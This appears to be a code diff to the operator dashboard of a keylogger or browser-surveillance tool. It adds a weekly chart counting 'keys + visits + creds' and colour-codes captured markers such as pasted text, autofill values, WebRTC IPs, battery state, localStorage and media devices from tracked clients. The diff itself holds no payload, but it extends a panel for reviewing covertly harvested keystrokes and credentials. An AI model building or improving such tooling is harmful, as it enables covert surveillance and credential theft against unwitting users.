@@ -459,6 +459,12 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                 <canvas id="activityChart" style="width:100%;height:120px;display:block"></canvas>
             </div>
         </div>
+        <div class="pnl full">
+            <div class="pnl-h"><h2>7-Day Activity</h2><span style="font-size:.6rem;color:var(--dim);margin-left:6px">keys + visits + creds</span></div>
+            <div class="pnl-b" style="padding:12px">
+                <canvas id="weeklyChart" style="width:100%;height:100px;display:block"></canvas>
+            </div>
+        </div>
     </div>
 </div>
 
@@ -1539,10 +1545,34 @@ function filterKeystrokes() {
 function renderKeystrokes(keys) {
     const c = $('#key-log');
     if (!keys || !keys.length) { c.innerHTML = '<div class="empty">No keystrokes captured</div>'; return; }
+    // Color map for special marker types
+    const markerColors = {
+        'PASTE': '#a78bfa', 'LINK CLICK': '#60a5fa', 'SCROLL DEPTH': '#34d399',
+        'RESIZE': '#94a3b8', 'IDLE': '#fbbf24', 'VISIBLE': '#6ee7b7',
+        'HIDDEN': '#f87171', 'PAGE TYPE': '#f472b6', 'PAGE SESSION': '#818cf8',
+        'WEBRTC IPs': '#fb923c', 'AUTOFILL': '#e879f9', 'AUTOFILL INPUT': '#d946ef',
+        'AUTOFILL DETECTED': '#c026d3', 'DEVICE ORIENTATION': '#38bdf8',
+        'BATTERY': '#4ade80', 'COPY': '#facc15', 'CUT': '#fb923c',
+        'PRINT': '#f472b6', 'RIGHT-CLICK': '#94a3b8', 'SELECTION': '#a3e635',
+        'NETWORK': '#22d3ee', 'FIELD FOCUS': '#c084fc', 'INPUT BLUR': '#a78bfa',
+        'TIMEZONE': '#67e8f9', 'LOCALSTORAGE': '#fde68a', 'SESSIONSTORAGE': '#fef3c7',
+        'MEDIA DEVICES': '#86efac', 'PAGE LOAD': '#bfdbfe',
+        'SCROLL': '#6ee7b7', 'MOTION': '#f9a8d4'
+    };
+    function colorizeMarker(text) {
+        // Color special [MARKER ...] prefixes
+        return text.replace(/\[([A-Z][A-Z\s\-]+)\]/g, (m, name) => {
+            const c2 = markerColors[name.trim()] || '#cbd5e1';
+            return `<span style="color:${c2};font-weight:600">${m}</span>`;
+        });
+    }
     const rows = keys.map(k => {
-        const highlighted = k.keys.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
+        const safe = escHtml(k.keys || '');
+        let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
-        return `<div class="key-entry">
+        highlighted = colorizeMarker(highlighted);
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION)/.test(k.keys || '');
+        return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
             <div class="key-text">${highlighted}</div>
@@ -2113,6 +2143,7 @@ function renderEvents() {
     }
     // Update activity chart
     try { updateActivityChart(); } catch(e) {}
+    try { loadHeatmap(); } catch(e) {}
 }
 
 function renderDevices() {
@@ -2609,6 +2640,70 @@ function toast(msg) {
 
 // ── Activity Chart ──
 let activityData = [];
+
+// ── 7-Day Heatmap Chart ──
+async function loadHeatmap() {
+    const data = await api('/api/heatmap?days=7' + filterParam());
+    if (!data || !data.daily) return;
+    const canvas = $('#weeklyChart');
+    if (!canvas) return;
+    const daily = data.daily; // index 0 = today
+    const labels = [];
+    for (let i = daily.length - 1; i >= 0; i--) {
+        const d = new Date(Date.now() - i * 86400000);
+        labels.push(d.toLocaleDateString([], { weekday: 'short', month: 'numeric', day: 'numeric' }));
+    }
+    const values = [...daily].reverse(); // oldest to newest
+    const ctx = canvas.getContext('2d');
+    const w = canvas.width = canvas.offsetWidth * 2;
+    const h = canvas.height = 200;
+    ctx.clearRect(0, 0, w, h);
+    const max = Math.max(...values, 1);
+    const bars = values.length;
+    const barW = (w - 40) / bars;
+    const barGap = 6;
+    const isDark = document.body.hasAttribute('data-dark');
+    const gridColor = isDark ? '#444' : '#e0e0e0';
+    const textColor = isDark ? '#999' : '#666';
+
+    // Grid lines
+    ctx.strokeStyle = gridColor; ctx.lineWidth = 1;
+    for (let i = 0; i <= 4; i++) {
+        const y = 10 + (h - 40) * (1 - i / 4);
+        ctx.beginPath(); ctx.moveTo(30, y); ctx.lineTo(w - 5, y); ctx.stroke();
+        ctx.fillStyle = textColor; ctx.font = '14px Consolas'; ctx.textAlign = 'right';
+        ctx.fillText(Math.round(max * i / 4), 28, y + 5);
+    }
+
+    // Bars
+    values.forEach((v, i) => {
+        const x = 32 + i * barW + barGap;
+        const bh = Math.max(2, (v / max) * (h - 50));
+        const y = h - 25 - bh;
+        const grad = ctx.createLinearGradient(x, y, x, h - 25);
+        grad.addColorStop(0, '#34d399');
+        grad.addColorStop(1, '#34d39922');
+        ctx.fillStyle = grad;
+        ctx.beginPath();
+        if (ctx.roundRect) ctx.roundRect(x, y, barW - barGap * 2, bh, [3, 3, 0, 0]);
+        else ctx.rect(x, y, barW - barGap * 2, bh);
+        ctx.fill();
+        // Value label on bar
+        if (v > 0) {
+            ctx.fillStyle = isDark ? '#aaa' : '#444';
+            ctx.font = '13px Consolas'; ctx.textAlign = 'center';
+            ctx.fillText(v, x + (barW - barGap * 2) / 2, Math.max(y - 3, 14));
+        }
+    });
+
+    // Date labels
+    ctx.fillStyle = textColor; ctx.font = '13px Consolas'; ctx.textAlign = 'center';
+    labels.forEach((lbl, i) => {
+        const x = 32 + i * barW + barGap + (barW - barGap * 2) / 2;
+        ctx.fillText(lbl.split('/')[0] || lbl, x, h - 8);
+    });
+}
+
 function updateActivityChart() {
     // Bucket events into 5-minute slots for the last hour
     const now = Date.now();
